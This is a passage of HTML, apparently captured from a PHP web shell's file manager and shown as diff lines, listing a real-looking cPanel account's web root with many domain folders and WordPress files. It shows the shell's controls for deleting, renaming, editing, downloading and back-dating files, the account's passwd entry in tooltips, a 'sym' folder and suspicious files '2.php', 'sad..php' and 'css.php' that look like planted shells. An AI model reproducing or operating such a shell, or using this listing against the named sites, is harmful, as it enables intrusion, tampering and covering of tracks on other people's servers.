+<a href="javascript:fileperm('/home3/laginha/public_html/ptescort.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/ptescort.com','Are you sure will delete ptescort.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/ptescort.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/quintadamaioridade.com');">quintadamaioridade.com</a></td>
+<td nowrap>2012-11-20 16:23:46</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/quintadamaioridade.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/quintadamaioridade.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/quintadamaioridade.com','Are you sure will delete quintadamaioridade.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/quintadamaioridade.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/rainbowalgarve.com');">rainbowalgarve.com</a></td>
+<td nowrap>2013-09-24 04:57:26</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/rainbowalgarve.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/rainbowalgarve.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/rainbowalgarve.com','Are you sure will delete rainbowalgarve.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/rainbowalgarve.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/rainbowvilamoura.com');">rainbowvilamoura.com</a></td>
+<td nowrap>2013-10-13 07:06:21</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/rainbowvilamoura.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/rainbowvilamoura.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/rainbowvilamoura.com','Are you sure will delete rainbowvilamoura.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/rainbowvilamoura.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/receitasdamalta.com');">receitasdamalta.com</a></td>
+<td nowrap>2012-12-16 15:57:32</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/receitasdamalta.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/receitasdamalta.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/receitasdamalta.com','Are you sure will delete receitasdamalta.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/receitasdamalta.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/receitaslowcost.com');">receitaslowcost.com</a></td>
+<td nowrap>2013-08-10 05:09:22</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/receitaslowcost.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/receitaslowcost.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/receitaslowcost.com','Are you sure will delete receitaslowcost.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/receitaslowcost.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/sym');">sym</a></td>
+<td nowrap>2014-01-16 10:07:25</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/sym');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/sym');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/sym','Are you sure will delete sym? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/sym');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/tasparvo.com');">tasparvo.com</a></td>
+<td nowrap>2013-11-03 14:34:27</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/tasparvo.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/tasparvo.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/tasparvo.com','Are you sure will delete tasparvo.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/tasparvo.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/terraencantada.me');">terraencantada.me</a></td>
+<td nowrap>2013-11-13 06:47:25</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/terraencantada.me');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/terraencantada.me');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/terraencantada.me','Are you sure will delete terraencantada.me? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/terraencantada.me');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/thumbsbox.com');">thumbsbox.com</a></td>
+<td nowrap>2013-05-21 02:08:58</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/thumbsbox.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/thumbsbox.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/thumbsbox.com','Are you sure will delete thumbsbox.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/thumbsbox.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/wp-admin');">wp-admin</a></td>
+<td nowrap>2012-12-11 10:20:48</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-admin');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-admin');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/wp-admin','Are you sure will delete wp-admin? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/wp-admin');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/wp-content');">wp-content</a></td>
+<td nowrap>2013-12-01 14:30:37</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-content');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-content');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/wp-content','Are you sure will delete wp-content? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/wp-content');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/wp-includes');">wp-includes</a></td>
+<td nowrap>2012-12-11 10:20:46</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-includes');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-includes');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/wp-includes','Are you sure will delete wp-includes? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/wp-includes');">Rename</a></td>
+</tr>
+<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>
+<form id="filelist" name="filelist" action="/2.php" method="post">
+<input id="action" type="hidden" name="action" value="file" />
+<input id="thefile" type="hidden" name="thefile" value="" />
+<input id="doing" type="hidden" name="doing" value="" />
+<input id="dir" type="hidden" name="dir" value="/home3/laginha/public_html/" />
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/.htaccess]"></td>
+<td><a href=".htaccess" target="_blank">.htaccess</a></td>
+<td nowrap>2013-05-25 06:08:13</td>
+<td nowrap>252 B</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/.htaccess');">0644</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/.htaccess');">-rw-r--r--</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/.htaccess');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/.htaccess');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/.htaccess','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/.htaccess');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/.htaccess','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/2.php]"></td>
+<td><a href="2.php" target="_blank">2.php</a></td>
+<td nowrap>2014-01-16 10:10:38</td>
+<td nowrap>92.47 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/2.php');">0644</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/2.php');">-rw-r--r--</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/2.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/2.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/2.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/2.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/2.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/css.php]"></td>
+<td><a href="css.php" target="_blank">css.php</a></td>
+<td nowrap>2014-01-16 21:31:00</td>
+<td nowrap>75.33 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/css.php');">0644</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/css.php');">-rw-r--r--</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/css.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/css.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/css.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/css.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/css.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/error_log]"></td>
+<td><a href="error_log" target="_blank">error_log</a></td>
+<td nowrap>2014-01-09 23:28:12</td>
+<td nowrap>13.17 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/error_log');">0644</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/error_log');">-rw-r--r--</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/error_log');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/error_log');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/error_log','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/error_log');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/error_log','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/fantastico_fileslist.txt]"></td>
+<td><a href="fantastico_fileslist.txt" target="_blank">fantastico_fileslist.txt</a></td>
+<td nowrap>2013-05-25 06:08:11</td>
+<td nowrap>307 B</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/fantastico_fileslist.txt');">0644</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/fantastico_fileslist.txt');">-rw-r--r--</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/fantastico_fileslist.txt');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/fantastico_fileslist.txt');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/fantastico_fileslist.txt','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/fantastico_fileslist.txt');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/fantastico_fileslist.txt','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/fantversion.php]"></td>
+<td><a href="fantversion.php" target="_blank">fantversion.php</a></td>
+<td nowrap>2013-01-16 04:16:22</td>
+<td nowrap>34 B</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/fantversion.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/fantversion.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/fantversion.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/fantversion.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/fantversion.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/fantversion.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/fantversion.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/index.php]"></td>
+<td><a href="index.php" target="_blank">index.php</a></td>
+<td nowrap>2014-01-16 21:31:21</td>
+<td nowrap>2.23 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/index.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/index.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/index.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/index.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/index.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/index.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/index.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/license.txt]"></td>
+<td><a href="license.txt" target="_blank">license.txt</a></td>
+<td nowrap>2012-05-06 02:28:28</td>
+<td nowrap>19.46 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/license.txt');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/license.txt');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/license.txt');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/license.txt');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/license.txt','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/license.txt');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/license.txt','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/readme.html]"></td>
+<td><a href="readme.html" target="_blank">readme.html</a></td>
+<td nowrap>2012-11-29 18:57:07</td>
+<td nowrap>8.96 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/readme.html');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/readme.html');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/readme.html');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/readme.html');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/readme.html','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/readme.html');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/readme.html','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/sad..php]"></td>
+<td><a href="sad..php" target="_blank">sad..php</a></td>
+<td nowrap>2014-01-16 10:09:45</td>
+<td nowrap>92.47 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/sad..php');">0644</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/sad..php');">-rw-r--r--</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/sad..php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/sad..php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/sad..php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/sad..php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/sad..php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-activate.php]"></td>
+<td><a href="wp-activate.php" target="_blank">wp-activate.php</a></td>
+<td nowrap>2012-11-17 09:11:29</td>
+<td nowrap>4.55 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-activate.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-activate.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-activate.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-activate.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-activate.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-activate.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-activate.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-blog-header.php]"></td>
+<td><a href="wp-blog-header.php" target="_blank">wp-blog-header.php</a></td>
+<td nowrap>2012-01-08 11:01:11</td>
+<td nowrap>271 B</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-blog-header.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-blog-header.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-blog-header.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-blog-header.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-blog-header.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-blog-header.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-blog-header.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-comments-post.php]"></td>
+<td><a href="wp-comments-post.php" target="_blank">wp-comments-post.php</a></td>
+<td nowrap>2012-04-10 12:21:17</td>
+<td nowrap>3.44 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-comments-post.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-comments-post.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-comments-post.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-comments-post.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-comments-post.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-comments-post.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-comments-post.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-config-sample.php]"></td>
